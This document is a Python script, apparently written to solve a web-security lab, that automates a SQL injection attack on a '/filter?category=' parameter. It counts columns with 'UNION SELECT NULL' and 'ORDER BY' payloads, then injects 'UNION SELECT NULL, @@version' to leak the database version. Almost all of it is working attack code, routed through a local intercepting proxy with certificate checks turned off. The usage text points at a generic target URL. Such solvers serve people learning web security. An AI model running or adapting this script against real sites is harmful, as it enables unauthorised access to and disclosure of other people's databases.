# SQL injection attack, querying the database type and version on MySQL and Microsoft

import sys
import requests
import urllib3
import urllib.parse
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Using payload:\t%s' % payload)
	return r

def get_version(s, url, string, columns_count):
	filter_path = url + '/filter?category='
	payload = "' UNION SELECT NULL, @@version-- -"
	print('[+] Trying to retrieve Version strings...')
	r = send_payload(s, filter_path, payload)
	res = r.text
	if string in res and r.status_code != 500:
		print('\n[+] Successfully Retrieved MySQL Version string:\n%s' % string)
	else:
		return False

def exploit_sqli(s, url, payload):
	filter_path = url + '/filter?category='
	if payload == "SOLUTION":
		show_usage()
	if payload == "SOLUTION1":
		print('[+] Using the UNION SELECT method to retrieve the number of columns...')
		payload = "' UNION SELECT NULL-- -"
		for i in range(1, 8):
			if send_payload(s, filter_path, payload).status_code == 200:
				print('\n[+] Number of Columns returned:\t%s' % i)
				return i
			else:
				payload = payload[:-4]
				payload += ", NULL-- -"
	elif payload == "SOLUTION2":
		print('[+] Using the ORDER BY method to retrieve the number of columns...')
		for i in range(1, 8):
			payload = "' ORDER BY %s-- -" % i
			if send_payload(s, filter_path, payload).status_code == 500:
				print('\n[+] Number of Columns returned:\t%s' % (i - 1))
				return i - 1
	else:
		return False

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\' UNION SELECT NULL, NULL"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION1\t\t(solve the lab)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION2\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	print('[+] Determining the number of columns returned by the query...\n')
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down <!>')
		sys.exit(-1)
	if not "SOLUTION" in payload:
		filter_path = url + '/filter?category='
		r = send_payload(s, filter_path, payload)
		if r.status_code == 200:
			print(r)
		else:
			print(r)
			print("[-] Server Respond with an ERROR <!>")
			exit(-1)
	else:
		columns_count = exploit_sqli(s, url, payload) 
		if columns_count:
			r = s.get(url)
			time.sleep(1)
			try:
				string = re.search("Make the database retrieve the string: '(.*)'", r.text).group(1)
			except:
				print('\n[-] NOT ABLE TO RETRIEVE THE STRING, LAB ALREADY SOLVED <!>')
				exit(-1)
			if string:
				get_version(s, url, string, columns_count)
			else:
				print('\n[-] SQL Injection Failed <!>')
		else:
			print('\n[-] SQL Injection Failed <!>')

if __name__ == "__main__":
	main()
